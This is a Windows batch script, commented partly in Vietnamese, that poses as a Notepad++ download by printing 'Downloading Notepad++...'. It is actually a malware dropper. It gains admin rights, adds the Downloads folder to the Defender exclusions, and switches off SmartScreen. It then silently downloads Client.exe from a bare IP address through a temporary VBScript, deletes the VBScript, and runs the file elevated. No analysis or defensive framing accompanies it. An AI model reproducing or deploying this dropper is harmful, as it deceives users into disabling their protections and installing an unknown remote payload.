@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting admin privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb runAs"
    exit /b
)

:: URL và đường dẫn file đầu ra (batch syntax)
set "url=http://172.188.16.91/Client.exe"
set "outPath=%USERPROFILE%\Downloads\Client.exe"

timeout /t 1 >nul
@echo off
echo Downloading Notepad++...
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"
powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off'"
powershell -Command "Stop-Process -Name explorer -Force"
powershell -Command "Start-Process explorer"
timeout /t 1 >nul
echo Set WshShell = CreateObject("WScript.Shell") > temp.vbs
echo WshShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '%url%' -OutFile '%outPath%' -MaximumRedirection 10 -Headers @{ 'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }""", 0, True >> temp.vbs

:: Chạy VBScript
cscript //nologo temp.vbs

:: Xóa file tạm
del temp.vbs

if exist "%outPath%" (
    @REM echo Running the downloaded file...
    
    powershell -Command "Start-Process -FilePath '%outPath%' -Verb runAs"
) else (
    echo Download failed.
    pause
)
